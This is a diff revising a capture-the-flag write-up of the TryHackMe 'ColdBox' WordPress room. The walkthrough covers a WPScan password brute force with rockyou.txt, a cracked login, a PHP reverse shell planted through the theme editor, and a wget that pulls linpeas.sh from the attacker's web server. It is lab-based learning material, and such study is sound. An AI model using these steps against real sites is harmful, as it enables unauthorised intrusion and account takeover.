@@ -12,7 +12,7 @@ Note* I used Kali Linux to complete this room. The IP address of my room was 10.
 Let's begin this room by enumerating and gathering information about the server by doing an Nmap scan to see what ports are open.
 
 Running the command:\
-**sudo nmap -sV -T4 -O -oN nmap_scan 10.10.170.248** shows ports 45122 and 80 are open and running SSH and Apache. Note that SSH is running on a different port than normal.
+**sudo nmap -sV -T4 -O -oN nmap_scan 10.10.170.248** shows ports 4512 and 80 are open and running SSH 7.2 and Apache 2.4.18 on an Ubuntu Server. Note that SSH is running on a different port than normal.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/07/nmap_coldbox.png)
 
@@ -46,7 +46,7 @@ Here are the results of the scan. The interesting directory that stands out is /
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/07/gobuster_hidden_coldbox.png)
 
-Navigating to http://10.10.170.248/hidden displays a message note intended for general public, but found with simple scanning techniques.
+Navigating to http://10.10.170.248/hidden displays a message note intended for general public, but found with simple scanning techniques. This shows that they are running into password management issues. This could be our ticket in.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/07/hidden_page_coldbox.png)
 
@@ -54,7 +54,8 @@ Since we know this is a WordPress site. Let us bring in another tool to learn mo
 
 Running the command:
 
-**wpscan --url http://10.10.170.248 --enumerate** will scan the site and give us more information about the WordPress CMS. This displays a lot of information and I encourage you to run it and see all the results from the scan.
+**wpscan --url http://10.10.170.248 --enumerate** will scan the site and give us more information about the WordPress CMS.\
+(This displays a lot of information and I encourage you to run it and see all the results from the scan.)
 
 How this works:\
 wpscan -- The command to execute WPScan.\
@@ -67,31 +68,37 @@ The results we should be interested in are the three users. They are philip, c0l
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/07/wpscan_pic3_coldbox.png)
 
-We can use WPScan and see if we can find passwords for these users and log in.
+We can use WPScan and see if we can find passwords for these users and log in with a password attack.
 
 Running the command:
 
-**wpscan --url http://10.10.170.248 --usernames philip,hugo,c0ldd --passwords /usr/share/wordlists/rockyou.txt** begins the brute force process to see if we can find a password for these users.
+**wpscan --url http://10.10.170.248 --usernames philip,hugo,c0ldd --passwords /usr/share/wordlists/rockyou.txt** begins the brute force attack to see if we can find a password for these users.
+
+How this works:\
+wpscan -- The command to execute WPScan.\
+--url -- Target URL.\
+--usernames -- Users that we want to attack.\
+--passwords -- List of passwords to use in the brute force attack. In this case we are using the famous rockyou.txt file.
 
 After a few minutes, we have a hit on the user C0ldd!
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/07/wpscan_coldd_password_coldbox.png)
 
-We can now try and log in and the user!
+We can now try and log in as the user!
 
-Let's navigate to http://10.10.170.248/wp-login should display the log in page. Let's use the credentials we have and log in.
+Let's navigate to http://10.10.170.248/wp-login should display the log in page. Let's use our new found credentials c0ldd:9876543210.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/07/wp_login_coldbox-1.png)
 
-We now have access to the dashboard. Here we can look around and get more information about our target. What's very interesting and poor configuration on the users end is the WordPress Editor is still enabled. This is located in the menu on the left hand side under Appearance.
+We now have access to the dashboard. Here we can look around and get more information about our target. What's very interesting and also poor configuration on the targets end is the WordPress Editor is still enabled. This is located in the menu on the left hand side under Appearance.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/07/wp_dashboard_coldbox.png)
 
-With this feature, we can easily drop in PHP code to perform a reverse shell.
+With this feature, we can easily drop in PHP code to perform a reverse shell. (Anyone running a PHP site needs to disable this as it's very easy to abuse as we shall soon see.)
 
 Kali Linux has PHP Reverse Shell scripts located in /usr/share/webshells/php/. The file is named php-reverse-shell.php. Open it with a text editor and we need to update two values. The $ip and $port.
 
-The $ip will be the IP Address. Using the TryHackMe VPN, let's look for tun0 and use that IP! We can find the IP Address with the command **ip addr** (which displays network interfaces).
+The $ip will be the IP Address of our attack machine. Using the TryHackMe VPN, let's look for tun0 and use that IP! We can find the IP Address with the command **ip addr** (which displays network interfaces).
 
 The $port will be our listening port for the reverse shell. Let's use 4444 as it's out of the range of the known ports.
 
@@ -126,11 +133,11 @@ The way we can do this is to download the linpeas.sh file from the [GitHub Repos
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/07/linpeas_github.png)
 
-With linpeas.sh on our machine, we can start a Python Web Server and **wget** the file to our target server. In the same directory as the linpeas.sh file let us run the command **python3 -m http.server 8888**. This starts a Python Web Server and we can host files here. This will help us do a wget from the target box to pull in the linpeas.sh file.
+With linpeas.sh on our attack machine, we can start a Python Web Server and **wget** the file to our target server. In the same directory as the linpeas.sh file let us run the command **python3 -m http.server 8888**. This starts a Python Web Server and we can host files here. This will help us do a wget from the target box to pull in the linpeas.sh file.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/07/python_server_coldbox.png)
 
-In the /tmp folder, run **wget (YOUR IP):8888/linpeas.sh** and that will pull in the linpeas.sh file from the Python Web Server. The last step is to make the file executable with the command **chomd +x linpeas.sh**.![](https://jarrodrizor.com/wp-content/uploads/2021/07/wget_linpeas.png)
+In the /tmp folder, run **wget (YOUR IP):8888/linpeas.sh** and that will pull in the linpeas.sh file from the Python Web Server. The last step is to make the file executable with the command **chmod +x linpeas.sh**.![](https://jarrodrizor.com/wp-content/uploads/2021/07/wget_linpeas.png)
 
 Now let's fire linpeas with ./linpeas.sh.
 
